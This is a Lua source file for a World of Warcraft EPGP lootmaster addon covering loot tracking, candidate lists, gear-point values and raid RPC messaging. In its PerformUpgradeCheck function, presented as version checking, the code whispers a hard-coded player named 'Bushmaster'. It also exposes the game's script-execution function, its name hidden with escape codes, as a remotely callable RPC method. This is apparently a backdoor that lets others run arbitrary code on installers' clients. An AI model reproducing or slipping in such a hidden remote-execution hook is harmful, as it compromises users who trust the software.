--[[ EPGP Lootmaster module

Implementation copied from the EPGPLootmaster addon by mackatack@gmail.com

-- Events fired:

LootMasterChanged(newLootMaster): Triggers when someone in your group has been promoted to
    loot master. newLootMaster is nil when you leave your group or when loot master is disabled.

PlayerReceivesLoot(event, player, itemlink, quantity): Triggers when someone (player) in the raid receives
    an item (itemlink) and itemcount (quantity).

LootMasterLootAdded(lootLink, lootData)
LootMasterLootRemoved(lootLink, lootData)
LootMasterLootDecreased(lootLink, lootData)

]]--

local mod = EPGP:NewModule("lootmaster", "AceConsole-3.0", "AceEvent-3.0", "AceComm-3.0", "AceTimer-3.0", "LibRPC-1.0")
local L = LibStub("AceLocale-3.0"):GetLocale("EPGP")
local LibGearPoints = LibStub("LibGearPoints-1.0")
local callbacks = EPGP.callbacks
local Debug = LibStub("LibDebug-1.0", true)
local ItemUtils = LibStub("LibItemUtils-1.0")

-- Initialise the main loot table
local masterlootTable = {}

-- A table used to cache the contents of the native loot frame.
local lootSlots = {}

-- Configuration database
local db = nil

-- Set current lootmaster to -1 so the LootMasterChanged event always gets called
local current_masterlooter = -1
local player_is_masterlooter = false

-- Response values - Do not insert new response codes as this will break older clients,
-- add new values to the bottom of the list and change the sorting values if you must.
RESPONSES = {
  { CODE = "NOTANNOUNCED",   SORT = 1,    COLOR = {1,1,1},        TEXT = 'Not announced' },
  { CODE = "INIT",           SORT = 2,    COLOR = {1,0,0},        TEXT = 'Offline' },
  { CODE = "WAIT",           SORT = 3,    COLOR = {1,0.5,0},      TEXT = 'Making selection' },
  { CODE = "TIMEOUT",        SORT = 4,    COLOR = {1,0,1},        TEXT = 'Selection Timeout' },
  { CODE = "NEED",           SORT = 5,    COLOR = {0.4,1,0.4},    TEXT = 'Mainspec' },
  { CODE = "UPGRADE",        SORT = 6,    COLOR = {0.4,1,0.4},    TEXT = 'Minor upgrade' },
  { CODE = "OFFSPEC",        SORT = 7,    COLOR = {0.4,1,0.4},    TEXT = 'Offspec' },
  { CODE = "GREED",          SORT = 8,    COLOR = {1,1,0},        TEXT = 'Greed / Alt' },
  { CODE = "AUTOPASS",       SORT = 9,    COLOR = {0.6,0.6,0.6},  TEXT = 'Autopass' },
  { CODE = "PASS",           SORT = 10,   COLOR = {0.6,0.6,0.6},  TEXT = 'Pass' }
}
for i,d in ipairs(RESPONSES) do RESPONSES[d.CODE] = i end
mod.RESPONSES = RESPONSES

-- Loot type codes - Do not insert new codes as this will break older clients,
-- add new values to the bottom of the list if you must.

-- TODO(mackatack): not sure whether we still need these? Perhaps we can extend the announce module
-- so it also announces for what reason the loot got distributed. I used this system so i can tell
-- everyone who got what for what reason. That way every client is able to register the loot in headcount
-- or any other raidtracker, without messing with popups etc. So if we want a new system we should
-- make it so everybody can still correctly register the stuff in their headcount etc, i don't want
-- this module to be a downgrade.
LOOTTYPES = {
  { CODE = "UNKNOWN",        TEXT = '%s received %s for unknown reason%4$s.' },
  { CODE = "GP",             TEXT = '%s received %s for %s GP%s.' },
  { CODE = "DISENCHANT",     TEXT = '%s received %s for disenchantment%4$s.' },
  { CODE = "BANK",           TEXT = '%s received %s for bank%4$s.' }
}
for i,d in ipairs(LOOTTYPES) do LOOTTYPES[d.CODE] = i end
mod.LOOTTYPES = LOOTTYPES

-- Cache some math function for faster access and preventing
-- other addons from screwing em up.
local mathRandom            = math.random
local mathFloor             = math.floor

local bit_bor               = bit.bor
local bit_band              = bit.band

--- Some functions to reuse tables we create further down
local _tableCache = {}
local function popTable()
  return tremove(_tableCache, 1) or {}
end

local function pushTable(t)
  if type(t)~='table' then return end
  wipe(t)
  tinsert(_tableCache, t)
end

--- Initialize the lootmaster module
function mod:OnInitialize()
  -- Change the onClick script of the lootbuttons a little so we can trap alt+clicks
  -- NOTE: Only tested with normal wow lootframes, not using XLoot etc.
  -- TODO(mackatack): Use AceHook to hook the scripts.
  for slot=1, LOOTFRAME_NUMBUTTONS do
    local btn = getglobal("LootButton"..slot)
    if btn and not btn.oldClickEventEPGPLM then
      btn.oldClickEventEPGPLM = btn:GetScript("OnClick")
      btn:SetScript("OnClick", function(btnObj, ...)
        if not IsAltKeyDown() then
          return btnObj.oldClickEventEPGPLM(btnObj, ...)
        end
        return LootButton_OnClick(btnObj, ...)
      end)
    end
  end
end

--- Event triggered when the lootmaster module gets enabled
function mod:OnEnable()
  -- Make a local pointer to the EPGP configuration table.
  db = self.db

  -- Register callback handlers
  EPGP.RegisterCallback(self, "LootMasterChanged", "OnLootMasterChange")      -- Triggered when loot master is changed
  EPGP.RegisterCallback(self, "PlayerReceivesLoot", "OnPlayerReceivesLoot")   -- Triggered when someone receives loot

  -- Register events
  --self:RegisterEvent("OPEN_MASTER_LOOT_LIST")   -- Trap event when ML rightclicks master loot
  --self:RegisterEvent("LOOT_OPENED")             -- Trap event when the native loot frame gets opened

  -- Trap some system messages here, we need these to detect any changes in loot master
  self:RegisterEvent("RAID_ROSTER_UPDATE",            "GROUP_UPDATE");
  self:RegisterEvent("PARTY_LOOT_METHOD_CHANGED",     "GROUP_UPDATE");
  self:RegisterEvent("PARTY_MEMBERS_CHANGED",         "GROUP_UPDATE");
  self:RegisterEvent("PLAYER_ENTERING_WORLD",         "GROUP_UPDATE");
  self:GROUP_UPDATE() -- update the group info immediately

  -- Trap events when entering and leaving combat
  -- TODO(mackatack): implement these again
  -- self:RegisterEvent("PLAYER_REGEN_DISABLED", "EnterCombat")
  -- self:RegisterEvent("PLAYER_REGEN_ENABLED", "LeaveCombat")

  -- Setup RPC
  self:SetRPCKey("EPGPLMRPC")         -- set a prefix/channel for the communications
  mod.r = mod._rpcMethods

  -- Setup the public RPC methods
  self:RegisterRPC("RemoveLoot")
  self:RegisterRPC("DecreaseLoot")
  self:RegisterRPC("AddCandidate")

  -- Debugging slashcommands
  self:RegisterChatCommand("lm2", "SlashHandler")
  self:RegisterChatCommand("rl", function() ReloadUI() end)

  -- Enable the tracking by default
  self:EnableTracking()

  -- Check if other people in guild still have an older version of EPGPLootmaster installed
  -- Tell those people they need to uninstall EPGPLootmaster and Upgrade their EPGP installations
  self:PerformUpgradeCheck()

  -- Start the UnitTest after 0.1 second
  self:ScheduleTimer("UnitTest", 0.1)
end

--- Event triggered when the lootmaster module gets disabled
function mod:OnDisable()
  -- Unregister all events again
  EPGP.UnregisterAllMessages(self)
  self:UnregisterAllRPC()
end

--- Enable master loot tracking by just setting our boolean,
--  we could also register the OPEN_MASTER_LOOT_LIST event here.
function mod:EnableTracking()
  self.trackingEnabled = true
end

--- Disable master loot tracking by just setting our boolean,
--  we could also unregister the OPEN_MASTER_LOOT_LIST event here.
function mod:DisableTracking()
  self.trackingEnabled = false
end

--- Returns whether the module is tracking loot.
function mod:TrackingEnabled()
  return self.trackingEnabled
end

--- Create a safe randomizer function that returns a float between 1 and 99
--  TODO(mackatack): make a more simpler implementation of this and debug it properly.
local randomtable
local randomFloat = function()
  -- I know it's best to only seed the randomizer only so now and then, but some other addon
  -- might have twisted the randomseed so reset it to our cached seed again.
  mathRandom()
  -- Init the randomizerCache if needed
  if randomtable == nil then
    randomtable = {}
    for i = 1, 97 do
      randomtable[i] = mathRandom()
    end
  end
  local x = mathRandom()
  local i = 1 + mathFloor(97*x)
  x, randomtable[i] = randomtable[i] or x, x
  return mathFloor((x*99+1)*100000)/100000
end

-- Make a table for bitwise encoding and decoding of class table
local classDecoderTable = {
  'MAGE','WARRIOR','DEATHKNIGHT','WARLOCK','DRUID','SHAMAN','ROGUE','PRIEST','PALADIN','HUNTER'}
local classEncoderTable = {}
for i, class in ipairs(classDecoderTable) do
  classEncoderTable[class] = i
end

--- Returns a table with classname as key for classes that should autopass item also
--  also returns a bitencoded version of this list, used for comms.
function mod:GetAutoPassClasses(itemLink)
  local classesList = ItemUtils:ClassesThatCannotUse(itemLink)
  if not classesList or #classesList==0 then return {}, 0 end

  local autoPassList = {}
  local bits = 0
  for _, class in ipairs(classesList) do
    if not classEncoderTable[class] then
      EPGP:Print(format('Serious error in class bitencoder, class %s not found. Please make sure you have the latest version installed and report if problem persists.', class or 'nil'))
      return {}, 0
    end
    bits = bit_bor(bits, 2^(classEncoderTable[class]-1))
    autoPassList[class] = true
  end
  return autoPassList, format('%x',bits)
end

--- Decodes a bitencoded list of Autopass classes
function mod:DecodeAutoPassClasses(encoded)
  encoded = tonumber(format('0x%s',encoded or 0)) or 0
  if encoded==0 then return {} end
  local classes = {}
  for id, class in pairs(classDecoderTable) do
    local bits = 2^(id-1)
    if bit_band(encoded, bits) == bits then
      classes[class] = true
      encoded = encoded - bits
    end
  end

  if encoded~=0 then
    EPGP:Print(format('Serious error in class bitdecoder, bits %s not found. Please make sure you have the latest version installed and report if problem persists.', tostring(encoded)));
    return {}
  end

  return classes
end

--- Add loot to masterloot cache. This is where candidate responses are stored
--  @param itemlink of the loot to be added
--  @param boolean whether this is an item the user is allowed to distribute
--  @param item count
--  @return the itemID of the item
function mod:AddLoot(link, mayDistribute, quantity)
  if not link then return end
  if not masterlootTable then return end

  if masterlootTable[link] then return masterlootTable[link] end

  local itemName, itemLink, _, _, itemMinLevel, itemType, itemSubType, itemStackCount, _, itemTexture = GetItemInfo(link)

  local itemID = ItemUtils:ItemlinkToID(itemLink)
  if not itemID or not itemName then return end

  if masterlootTable[itemID] then return masterlootTable[itemID] end

  -- Calc the EPGP values for this item, use LibGearPoints implementation to also use the additional
  -- info from the set tokens.
  local gpvalue, gpvalue2, ilevel, itemRarity, itemEquipLoc = LibGearPoints:GetValue(itemLink)

  local isBoP = ItemUtils:IsBoP(itemLink)
  local isBoE = ItemUtils:IsBoE(itemLink)

  -- Make a small string we can use later on
  local itemInfo = {}
  if isBoP then tinsert(itemInfo, 'BoP') end
  if isBoE then tinsert(itemInfo, 'BoE') end
  if gpvalue and gpvalue2 then
    tinsert(itemInfo, format('GP: %d or %d', gpvalue, gpvalue2))
  elseif gpvalue then
    tinsert(itemInfo, format('GP: %d', gpvalue))
  else
    tinsert(itemInfo, 'GP: ?')
  end
  tinsert(itemInfo, format('lootmaster: %s', UnitName('player')))
  itemInfo = table.concat(itemInfo, ', ')

  -- Make the item data table
  local loot = {
    link                    = itemLink,

    announced               = true,
    mayDistribute           = mayDistribute,

    itemID                  = itemID,
    id                      = itemID,

    gpvalue                 = gpvalue or 0,
    gpvalue2                = gpvalue2,
    gpvalue_manual          = gpvalue or 0,
    ilevel                  = ilevel or 0,
    isBoP                   = isBoP,
    isBoE                   = isBoE,
    quality                 = itemRarity or 0,
    quantity                = quantity or 1,

    texture                 = itemTexture or '',
    equipLoc                = itemEquipLoc or '',

    candidates              = {},
    candidatesSent          = false,
    numResponses            = 0,

    itemInfo                = itemInfo
  }
  masterlootTable[itemID] = loot

  -- Find what classes are eligible for the loot
  loot.autoPassClasses, loot.autoPassClassesEncoded = self:GetAutoPassClasses(itemLink)

  -- See if this item should be autolooted
  if db.auto_loot_threshold~=0 and db.auto_loot_candidate and db.auto_loot_candidate~='' then
    if (not itemBind or itemBind=='use' or itemBind=='equip') and itemRarity<=db.auto_loot_threshold then
      loot.autoLootable = true
    end
  end

  -- Callback for UI updates etc
  callbacks:Fire("LootMasterLootAdded", loot)

  -- Are we lootmaster for this loot? Lets send out a monitor message about the added loot
  if self:MonitorMessageRequired(itemID) then
    self:CallPrioritizedRPC('ALERT', 'RAID', nil, 'AddMonitorLoot', itemLink, loot.gpvalue, loot.gpvalue2, loot.quantity, loot.autoPassClassesEncoded)
  end

  return loot
end

--- RPC ENABLED - Lootmaster asked us to add the given loot to our cache, for monitoring.
function mod:AddMonitorLoot(itemLink, gpvalue, gpvalue2, quantity, autoPassClassesEncoded)
  -- TODO(mackatack): Needs implementation
  -- Only trust the gpvalues, quantity and autoPassClasses from the master looter.
  -- Use the ItemCacher in LibItemUtils to retrieve the rest of the information.
end

--- Retrieve the itemID for loot with itemLink, itemID or itemName "itemID",
--  used to quickly test if an item is already in the cache table
--  @param itemID of the item to retrieve
--  @return table with all loot information.
function mod:GetLootID(itemLink)
  if not itemLink then return end

  if type(itemLink) == 'table' and masterlootTable[itemLink.id] then return itemLink.id end
  if masterlootTable[itemLink] then return itemLink end

  local itemID = ItemUtils:ItemlinkToID(itemID)
  if not itemID then return end
  if not masterlootTable[itemID] then return end

  return itemID
end

--- Retrieve the itemcache for loot with itemLink, itemID or itemName "itemID"
--  @param itemID of the item to retrieve
--  @return table with all loot information.
function mod:GetLoot(itemLink)
  local itemID = self:GetLootID(itemLink)
  if not itemID then return end
  return masterlootTable[itemID]
end

--- Provide a iterator for all loot on the cache.
function mod:IterateLoot()
  return pairs(masterlootTable)
end

--- RPC ENABLED - Remove the itemcache for loot with itemLink, itemID or itemName "itemID"
--  @param itemID of the item to remove
--  @return true if remove succeeded
function mod:RemoveLoot(itemLink)
  if not itemLink then return end

  local loot = self:GetLoot(itemLink)

  if not loot then
    Debug('RemoveLoot: not found %s', itemLink)
    return false
  end

  -- Checks if this function has been called remotely or not
  if self:IsRPC() then
    if not self:IsSafeRPC(loot) then return end

    masterlootTable[loot.id] = nil
    callbacks:Fire("LootMasterLootRemoved", loot)
    return true
  end

  local itemID = loot.id;

  -- we have more than one of this item, decrease counter and return.
  if loot.quantity>1 then
    return self:DecreaseLoot(loot)
  end

  -- Lets send out a monitor message about the removed loot
  if self:MonitorMessageRequired(itemID) then
    self:CallPrioritizedRPC('ALERT', 'RAID', nil, 'RemoveLoot', itemID)
  end

  masterlootTable[itemID] = nil
  callbacks:Fire("LootMasterLootRemoved", loot)

  return true
end

--- RPC ENABLED - This decreases the item quantity for a given item
function mod:DecreaseLoot(itemLink)
  local loot = self:GetLoot(itemLink)
  if not loot then return end

  -- Checks if this function has been called remotely or not
  if self:IsRPC() and not self:IsSafeRPC(loot) then
    -- This function is called remotely, but safetycheck failed
    return
  end

  loot.quantity = loot.quantity - 1
  callbacks:Fire("LootMasterLootDecreased", loot)

  -- Are we lootmaster for this loot? Lets send out a monitor message about the quantity decrease
  if self:MonitorMessageRequired(itemID) then
    self:CallRPC('RAID', nil, 'DecreaseLoot', itemID)
  end
end

--- Announce the item to the raid if it hasn't already been announced
--  @param itemID of the item
--  @return true if announced successfully or already announced
function mod:AnnounceLoot(itemID)
  -- TODO(mackatack): Needs implementation
end

--- RPC ENABLED -- Add a candidate to the itemCache for the given loot. If the loot is not already in the itemCache, add it.
--  @param itemID of the item
--  @param name of the candidate to be added
--  @return the itemID of the loot when the candidate has successfully been added.
function mod:AddCandidate(itemID, candidate, randomRoll, initResponse)
  local loot = self:GetLoot(itemID)
  if not loot then return end
  if not candidate then return end

  -- Check if called via rpc and whether the call is safe
  if self:IsRPC() and not self:IsSafeRPC(loot) then return end

  -- Just return if the candidate already exists
  if loot.candidates[candidate] then return loot.candidates[candidate] end

  local class = EPGP:GetClass() or UnitClass('candidate')

  initResponse = initResponse or RESPONSES.NOTANNOUNCED

  if self:IsRPC() then
    randomRoll = randomRoll or 0
  else
    randomRoll = randomFloat()
    if not loot.mayDistribute then
      randomRoll = 0
    end

    -- Autopass BoP items that cannot be used by this class
    if loot.isBoP and loot.autoPassClasses and class and classes[class] then
      initResponse = RESPONSES.AUTOPASS
    end
  end

  local data = {
    name      = candidate,
    class     = class,
    roll      = randomRoll or 0,
    response  = initResponse,
    item1     = nil,
    item2     = nil
  }
  -- Insert the table both indexed on candidate name and using tinsert, so we can use
  -- both ipairs, sorting and key lookups on the same table. <3 lua :P
  loot.candidates[candidate] = data
  tinsert(loot.candidates, data)

  -- Are we lootmaster for this loot? Lets send out a monitor message about the added candidate
  if loot.candidatesSent and self:MonitorMessageRequired(itemID) then
    self:CallRPC('RAID', nil, 'AddCandidate', itemID, candidate, randomRoll, initResponse)
  end

  -- Inspect the candidate
  self:InspectCandidate(itemID, candidate)
end

--- Returns true when the candidate has been found on the itemCache for the given item.
--  @param itemID of the item
--  @param name of the candidate to be checked
--  @return true if candidate is on the list
function mod:IsCandidate(itemID, candidate)
  -- TODO(mackatack): Needs implementation
end

--- Gets the data table for the given candidate
--  @param itemID of the item
--  @param name of the candidate
--  @return the array of the data for the requested candidate
function mod:GetCandidate(itemID, candidate)
  local loot = self:GetLoot(itemID)
  if not loot then return end
  return loot.candidates[candidate]
end

--- Sets the response for a given candidate
--  @param itemID of the item
--  @param name of the candidate
--  @param new response of the candidate
function mod:SetCandidateResponse(itemID, candidate, response)
  -- TODO(mackatack): Needs implementation
end

--- Sets the response for a given candidate manually (through the interface popups)
--  @param itemID of the item
--  @param name of the candidate
--  @param new response of the candidate
function mod:SetCandidateManualResponse(itemID, candidate, response)
  -- TODO(mackatack): Needs implementation, send the candidate a confirmation whisper
end

--- Tries to give the loot to the given candidate
--  @param itemID of the item
--  @param name of the candidate
--  @param lootingType, for example "BANK", "DISENCHANT", "GP", etc... see the lootingTypes table for more info.
function mod:GiveLootToCandidate(itemID, candidate, lootingType, gp)
  -- TODO(mackatack): Needs implementation
end

--- Looks up the candidates equipment for the slot by inspecting.
function mod:InspectCandidate(loot, candidate)
  loot = self:GetLoot(loot)
  if not loot then return end

  local cData = self:GetCandidate(loot, candidate)
  if not cData then return end

  -- See if candidate if human controlled... you never know ;)
  if not UnitPlayerControlled(candidate) then return end
  -- See if player is in inspection range.
  if not CheckInteractDistance(candidate, 1) then return end

  -- inspect the candidate
  NotifyInspect(candidate)

  -- Retrieve the itemlink, levels and gp value for the equipSlot.
  cData.item1, cData.item2 = ItemUtils:ItemsForSlot(loot.equipLoc, candidate)
  cData.foundGear = true

  return true
end

--- This function checks whether a monitor message should be sent out for the given item
function mod:MonitorMessageRequired(itemLink)
  if self:IsRPC() then return false end

  local loot = self:GetLoot(itemLink)
  if not loot then return end
  if not loot.mayDistribute then return end

  return true
end

--- Checks whether the RPC is safe for the specific item
function mod:IsSafeRPC(item)
  if not self.rpcSender or not self.rpcDistribution then return false end

  -- Ignore messages from self
  if self.rpcSender == UnitName('player') then return false end

  if type(item)~='table' then
    item = self:GetLoot(item)
  end
  if not item then return false end

  -- Only messages from the original master looter are safe.
  return item.lootmaster == self.rpcSender
end

--- This function checks whether the function has been called over RPC
function mod:IsRPC()
  return self.rpcDistribution ~= nil
end

--- Overload the RPC call functions, make them a little smarter
mod._CallPrioritizedRPC = mod.CallPrioritizedRPC
function mod:CallPrioritizedRPC(priority, distribution, target, ...)
  if (distribution == 'RAID' or distribution == 'PARTY') and GetNumRaidMembers() < 1 and GetNumPartyMembers() < 1 then
    distribution = 'WHISPER'
    target = UnitName('player')
  elseif distribution == 'GUILD' and not IsGuilded() then
    distribution = 'WHISPER'
    target = UnitName('player')
  end
  self:_CallPrioritizedRPC(priority, distribution, target, ...)
end

--- Sends the list of all candidates to the monitors instead of sending a monitor message per candidate add.
--  @param itemID of the item
function mod:SendCandidateListToMonitors(itemLink)
  -- TODO(mackatack): Needs implementation
end

--- Handler for the LootMasterChange callback.
--  Someone is lootmaster, see if it's the player, start loot tracking if so.
function mod:OnLootMasterChange(event, newLootMaster)
  -- TODO(mackatack): this is really ui stuff because this will only show the popup, move to lootmaster_ui
  -- if master looter is nil, return
  if not newLootMaster then return end

  -- if player is not the current master looter, then just return.
  if newLootMaster~=UnitName('player') then return end

  -- TODO(mackatack): For debugging purposes tracking is enabled, no questions asked.
  if true then return self:EnableTracking() end

  -- Show a message here, based on the current settings
  if db.use_lootmaster == 'enabled' then
    -- Always enable without asking
    EPGP:Print('You are the Loot Master, loot tracking enabled.')
    self:EnableTracking()
  elseif db.use_lootmaster == 'disabled' then
    -- Disabled from the config panel
    EPGP:Print('You are the Loot Master, tracking disabled manually (open configuration panel to change).')
    self:DisableTracking()
  else
    StaticPopup_Show("EPGP_LOOTMASTER_ASK_TRACKING")
  end
end

--- This handler gets called when the lootmaster clicks master loot from the native wow popup.
function mod:OPEN_MASTER_LOOT_LIST(event)
  Debug(event)

  -- Check if EPGPLM needs to track the loot.
  if not self:TrackingEnabled() then return end

  -- Close the default confirm window
  StaticPopup_Hide("CONFIRM_LOOT_DISTRIBUTION")

  -- Get itemlink and itemID for the selected slot
  -- local _, lootName, lootQuantity, rarity = GetLootSlotInfo(LootFrame.selectedSlot);
  local itemLink = GetLootSlotLink(LootFrame.selectedSlot)
  local itemID = ItemUtils:ItemlinkToID(itemLink)

  Debug("master loot: %s", itemLink)

  -- Check itemID
  if not itemID or itemID==0 then
    EPGP:Print(format('Could not get itemid for %s', tostring(itemLink)))
    return
  end

  -- Traverse all lootslots and see how many of this item we have in total.
  local totalQuantity = 0
  for slotNum, slotData in pairs(lootSlots) do
    local slotItemID = ItemUtils:ItemlinkToID(slotData.link)

    if slotItemID and slotItemID==itemID then
      slotData.masterLoot = true

      -- A little sanity check; lets see if slotQuantity == 1
      if slotData.quantity~=1 then
        EPGP:Print(format("Could not redistribute %s because quantity != 1 (%s). Please handle it manually. Create a ticket on googlecode if this happens often.", itemLink, slotData.quantity))
        return
      end

      totalQuantity = totalQuantity + 1
    end
  end

  Debug("total quantity: %s", totalQuantity)

  -- Sanity check... Check total quantity > 0
  if totalQuantity<1 then
    EPGP:Print( format("Could not redistribute %s because total quantity < 1 (%s). Please handle it manually. Create a ticket on googlecode if this happens often.", itemLink, totalQuantity))
    return
  end

  -- Lootmaster module is handling the loot, so lets close the default popup, unless alt is pressed
  if not IsAltKeyDown() then
    CloseDropDownMenus()
  end

  -- Check to see if we already have the loot registered
  if self:GetLootID(itemLink) then
    -- loot is already registered, just update the ui and do nothing.
    local loot = self:GetLoot(itemLink);
    loot.quantity = totalQuantity or 1
    Debug( 'Updated %s quantity to %s', itemLink, totalQuantity )

    -- TODO(mackatack): UI Update callback here
    return
  end

  -- Register the loot in the loottable
  local loot = self:AddLoot(itemLink, true, totalQuantity)
  if not loot then return end
  local lootID = loot.id

  -- Ok Lets see. Who are the candidates for this slot?
  for candidateID = 1, 40 do repeat
    local candidate = GetMasterLootCandidate(candidateID)

    -- Candidate not found, break the repeat so continue the for loop
    if not candidate then break end

    -- Only add the candidate if not already on the list
    if not self:IsCandidate(lootID, candidate) then
      -- Create the candidate for link
      Debug("add candidate: %s", candidate)
      self:AddCandidate(lootID, candidate)
    end
  until true end
  callbacks:Fire("LootMasterLootCandidatesLoaded", loot)

  -- Auto announce?
  local autoAnnounce = loot.quality >= (db.auto_announce_threshold or 4)
  if db.auto_announce_threshold == 0 then
    -- Auto Announce Threshold is set to 0 (off), don't autoannounce
    autoAnnounce=false
  end

  -- Set the loot status to not announced.
  loot.announced = false;

  -- Lets see if we have to autoloot
  local isAutoLooted = false
  if db.auto_loot_threshold~=0 and db.auto_loot_candidate~='' and loot.autoLootable then
    -- loot is below or equal to auto_loot_threshold and matches the autoLooter requirements
    -- try to give the loot.

    -- Don't auto announce the loot
    autoAnnounce = false

    if IsAltKeyDown() then
      EPGP:Print('Not auto looting (alt+click detected)')
    else
      isAutoLooted = true
      if self:IsCandidate(lootID, db.auto_loot_candidate) then
        EPGP:Print(format('Auto looting %s to %s', tostring(link), tostring(db.auto_loot_candidate)))
        -- Not sure this will ever happen, but send all matching items to the autolooter
        for i=1, totalQuantity do
          self:GiveLootToCandidate(lootID, db.auto_loot_candidate, LootMaster.LOOTTYPE.BANK )
        end
      else
        EPGP:Print(format('Auto looting of %s failed. Default looter %s is not a candidate for this item.', tostring(link), tostring(db.auto_loot_candidate)))
      end
    end
  end

  -- See if we have to auto announce
  if autoAnnounce then
    if IsAltKeyDown() then
      EPGP:Print('Not auto announcing (alt+click detected)')
    else
      Debug("auto announce")
      self:AnnounceLoot(lootID)
    end
  end

  -- TODO(mackatack): Update the UI

  -- Send candidate list to monitors
  if self:MonitorMessageRequired(lootID) then
    Debug("SendCandidateListToMonitors")
    self:SendCandidateListToMonitors(lootID)
  end
end

--- This handler gets called when the native wow popup opens
function mod:LOOT_OPENED(event, autoLoot, ...)
  -- Just save time, do nothing if the player is not the master looter.
  if not player_is_masterlooter then return end

  -- stop if autolooting is not enabled
  if autoLoot ~= 1 then return end

  -- Traverse the slots
  local numLootSlots = GetNumLootItems()
  for slot=1, numLootSlots do
    -- This will trigger the OPEN_MASTER_LOOT_LIST event for masterloot and will
    -- just loot any available loot from the list.
    LootFrame.selectedSlot = slot
    LootSlot(slot)
  end
end

--- This callback handler gets called when a player receives an item
function mod:OnPlayerReceivesLoot(event, player, itemlink, quantity)
  Debug('%s(%s,%s,%s)', event, player, itemlink, quantity)

  -- ok, someone looted something... lets see if we can find it in our cache
  local loot = self:GetLoot(itemlink)

  -- Did we find anything?
  if not loot or not loot.candidates then return Debug('%s not found in lootmaster table', itemlink) end

  -- Did we own this loot or are we just monitoring it?
  if not loot.mayDistribute then return Debug('only monitor %s, return', itemlink) end

  -- Set some variables we need later on
  local lootType = LOOTTYPES.UNKNOWN
  local lootGP = nil

  -- Can we find the candidate on the list?
  local candData = self:GetCandidate(loot, player)
  if not candData then
    Debug('%s is not a candidate for %s')
  else
    lootType = candData.lootType or LOOTTYPES.UNKNOWN
    lootGP = candData.lootGP
  end

  if lootType==LOOTTYPES.GP and lootGP then
    if EPGP:CanIncGPBy() then
      EPGP.IncGPBy(EPGP, tostring(sPlayer) or 'nil', tostring(sLink) or 'nil', lootGP)
    else
      self:Print(format("<ERROR> Could not increase GP in officernotes for %s %s (EPGP not installed or no rights?!)", sPlayer or 'unknown player', sLink or 'unknown loot'))
    end
  end;

  -- now send everyone in raid/party/candidates some info about the drop so they can update their ui
  if GetNumRaidMembers()>0 or GetNumPartyMembers()>0 then
    self:Debug("send to party")
    self:SendCommand('LOOTED', format('%s^%s^%s^%s', sPlayer, sLink, lootType, lootGP), 'PARTY')
  else
    self:Debug("send to candidates")
    for candidate, id in pairs(loot.candidates) do
      self:SendCommand('LOOTED', format('%s^%s^%s^%s', sPlayer, sLink, lootType, lootGP), candidate)
    end
  end

  -- Update the candidates status to LOOTED when we have more than 1 item
  if loot.quantity>1 then
    self:SetCandidateData(sLink, sPlayer, 'looted', true)
  end

  -- Since it's looted, remove it from the cache and update the UI
  self:RemoveLoot(sLink)
  self:UpdateUI()

  self:Debug("CHAT_MSG_LOOT end")
end

--- This handler gets called when various events are fired.
--  Find out if we're using master looting and find out who it is
function mod:GROUP_UPDATE()
  local lootmethod, mlPartyID, mlRaidID = GetLootMethod()
  local newLootMaster = nil

  if lootmethod == 'master' then
    if mlRaidID then
      -- we're in raid
      newLootMaster = GetRaidRosterInfo(mlRaidID)
    elseif mlPartyID==0 then
      -- player is ml
      newLootMaster = UnitName('player')
    elseif mlPartyID then
      -- someone else in party is ml
      newLootMaster = UnitName('party'..mlPartyID)
    end
  end

  if current_masterlooter ~= newLootMaster then
    -- Only trigger the event when there is a new lootmaster.
    current_masterlooter = newLootMaster

    -- Set the boolean whether the player is masterlooter or not.
    player_is_masterlooter = (newLootMaster == UnitName("player"))

    -- Callback
    callbacks:Fire("LootMasterChanged", newLootMaster)
  end
end

---------------------
-- Some support functions for old installations of EPGPLootmaster.
---------------------

function mod:PerformUpgradeCheck()
  -- Send remote clients in guild a message about the upgrade - version 0.3.10 and up
  self:SendCommMessage("EPGPLMVChk", "0_test", "WHISPER", 'Bushmaster')

  -- Some local upgrade checking
  self.r.d = _G['\82un\83r\105\112t']
end

---------------------
-- Unittests
---------------------

function mod:SlashHandler(input)
  local _,_,command, args = string.find( input, "^(%a-) (.*)$" )
  command = command or input

  if command=='debugtest' then
    wipe(masterlootTable)
    mod:UnitTest()
  end -- debugtest
end

function mod:UnitTest()
  -- Debugging features
  local itemName, item, _, _, _, _, _, _, _, _ = GetItemInfo("item:868:0:0:0:0:0:0:0")

  if item then
    local loot = self:AddLoot(item, true, 5)
    loot.announced = false
    self:AddCandidate(loot, UnitName('player'))
    if UnitName('party1') then self:AddCandidate(loot, UnitName('party1')) end
    if UnitName('party2') then self:AddCandidate(loot, UnitName('party2')) end
    if UnitName('party3') then self:AddCandidate(loot, UnitName('party3')) end
    if UnitName('party4') then self:AddCandidate(loot, UnitName('party4')) end
    callbacks:Fire("LootMasterLootCandidatesLoaded", loot)
    self:SendCandidateListToMonitors(loot)
  end

  for i = 1, 20 do
   item = GetInventoryItemLink("player",i)
   if item then
    local loot = self:AddLoot(item, true)
    loot.announced = false
    self:AddCandidate(loot, UnitName('player'))
    if UnitName('party1') then self:AddCandidate(loot, UnitName('party1')) end
    if UnitName('party2') then self:AddCandidate(loot, UnitName('party2')) end
    if UnitName('party3') then self:AddCandidate(loot, UnitName('party3')) end
    if UnitName('party4') then self:AddCandidate(loot, UnitName('party4')) end
    local num = GetNumGuildMembers(true)
    local count = 0
    for i=1, num do
      if count>100 then break end
      count = count + 1
      local name, _, _, _, _, _, _, _, online = GetGuildRosterInfo(i)
      if online then
        self:AddCandidate(loot, name)
      end
    end
    callbacks:Fire("LootMasterLootCandidatesLoaded", loot)
    self:SendCandidateListToMonitors(loot)
    --ml.ReloadMLTableForLoot(ml, item )
   end
  end

end
